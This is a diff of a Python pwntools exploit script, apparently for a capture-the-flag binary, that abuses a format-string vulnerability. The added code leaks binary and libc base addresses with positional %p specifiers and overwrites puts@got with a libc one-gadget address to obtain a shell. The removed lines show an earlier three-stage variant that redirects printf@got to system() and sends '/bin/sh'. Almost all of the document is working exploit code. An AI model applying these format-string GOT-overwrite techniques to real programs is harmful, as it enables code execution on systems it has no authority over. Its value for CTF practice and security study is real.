@@ -16,13 +16,6 @@ def conn():
         # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
         r = process([e.path], stdin=process.PTY, stdout=process.PTY)
     elif args.GDB:
-        # r = gdb.debug([e.path], '''
-        #               b *(main)
-        #               b *(main+0x73)
-        #               b *(main+0xd2)
-        #               b *(main+0xfc)
-        #               c
-        #               ''', stdin=process.PTY, stdout=process.PTY)
         r = process([e.path], stdin=process.PTY, stdout=process.PTY)
         gdb.attach(r, gdbscript='''
                       b *(main)
@@ -43,57 +36,37 @@ def conn():
 def main():
     r = conn()
 
-    # FSB to leak addresses and use %n to overwrite content.
+    # FSB to leak addresses and use %n to overwrite content
+    # +
+    # ONE GADGET!!!
+
+    # The following payload may need to be run several times to get it work.
+
     # !!! Note that we should use gdb.attach() instead of the gdb.debug() otherwise the offsets below will be wrong when in non-debug mode.
     # This is likely due to gdb.debug() will disable ASLR.
 
-    # Iteration 1
-    # leak binary and stack address
-    # The 36 and 39 are found by debugging and checking stack values.
-    r.sendlineafter(b'say something scary!', b'%36$p%39$p')
+    # #(formater) is from the fuzz.py
+    r.sendlineafter(b'say something scary!', b'%36$p%49$p')
     r.recvuntil(b'Seriously?? I bet you can do better than ')
     r.recvline()
     data = r.recvline().strip()
-    _, binary_addr, stack_addr = data.split(b'0x')
-    main_addr = int(binary_addr, 16) + 0x1380   # the 0x1380 is found by substracting the output address to the main address during GDB
-    ret_addr = int(stack_addr, 16) - 0x4b1
-    info(f'calculated main address {hex(main_addr)}, ret address is on stack address {hex(ret_addr)}')
-    main_offset = e.sym.main - e.address
-    e.address = main_addr - main_offset
+    _, tmp_binary_addr, tmp_libc_addr = data.split(b'0x')
+    # check the fuzz.py for the offsets.
+    binary_addr = int(tmp_binary_addr, 16) - 0x40
+    libc_addr = int(tmp_libc_addr, 16) - 0x29d90
+    info(f'calculated binary address {hex(binary_addr)}, libc address {hex(libc_addr)}')
+    e.address = binary_addr
+    libc.address = libc_addr
 
+    # the og_offset is from the `ong_gadget glibc/libc.so.6`. Not everyone works.
+    og_offset = 0xebcf5
+    og_addr = libc.address + og_offset
+    info(f'puts@got is at {hex(e.got.puts)}, one gadget is at {hex(og_addr)}')
     payload = fmtstr_payload(offset=8, writes={
-        ret_addr: ROP(e).ret[0],  # This is for stack alignment purpose
-        ret_addr + 8: main_addr,
+        e.got.puts: og_addr
         })
     # payload = 'AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' # Use this to locate the offset (8).
     r.sendlineafter(b'one more time..', payload)
-
-    # Iteration 2
-    # leak libc base address
-    r.sendlineafter(b'say something scary!', b'%67$p')
-    r.recvuntil(b'Seriously?? I bet you can do better than ')
-    r.recvline()
-    data = r.recvline().strip()
-    output_addr = int(data, 16)
-    libc.address = output_addr - 0x29e40
-    info(f'the leaked libc base address is {hex(libc.address)}')
-    info(f'then the printf is at {hex(libc.sym.printf)}')
-    info(f'then the system is at {hex(libc.sym.system)}')
-    info(f'the printf@got is at {hex(e.got.printf)}')
-
-    # overwrite print@got to system() 
-    payload = fmtstr_payload(offset=8, writes={
-        e.got.printf: libc.sym.system,
-        ret_addr + 0x10: ROP(e).ret[0],  # This is for stack alignment purpose
-        ret_addr + 0x18: main_addr,
-        }, write_size='short')
-    # pause()
-    r.sendlineafter(b'one more time..', payload)
-
-    # Iteration 3
-    # Trigger system('/bin/sh')
-    # pause()
-    r.sendlineafter(b'say something scary!', b'/bin/sh')
 
     r.interactive()
 
